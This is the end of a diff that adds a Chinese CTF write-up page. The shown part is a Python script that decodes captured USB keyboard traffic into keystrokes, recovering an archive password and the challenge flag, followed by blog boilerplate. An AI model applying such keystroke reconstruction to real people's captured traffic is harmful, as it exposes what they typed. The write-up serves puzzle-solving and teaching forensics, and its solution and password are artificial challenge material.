class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>
+<p>得到：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200327172600480.png" alt="在这里插入图片描述"><br>在vim中敲入对应的按键得到：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200327172659487.png" alt="在这里插入图片描述"><br>可能哪里敲错了(应该是honk和Of)，得到压缩包的密码为：honkover1esOfNanle</p>
+<p>解压得到flag：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/YLB-CTF-Writeup/20200327172857396.png" alt="在这里插入图片描述"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://lethesec.github.io/blog/2020/0330/YLB-CTF-Writeup/">https://lethesec.github.io/blog/2020/0330/YLB-CTF-Writeup/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/blog/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/blog/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/blog/2020/0426/ThinkPHPv6-0-unserialize/">ThinkPHP v6.0.x 反序列化</a>
+            
+            
+            <a class="next" rel="next" href="/blog/2020/0324/bypass-apostrophe-ctf-sqli-learn/">通过两道CTF题学习过滤单引号的SQL注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>Life is a struggle.</span>
+        <!-- <span>© Lethe | 2019 - 2022</span> -->
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
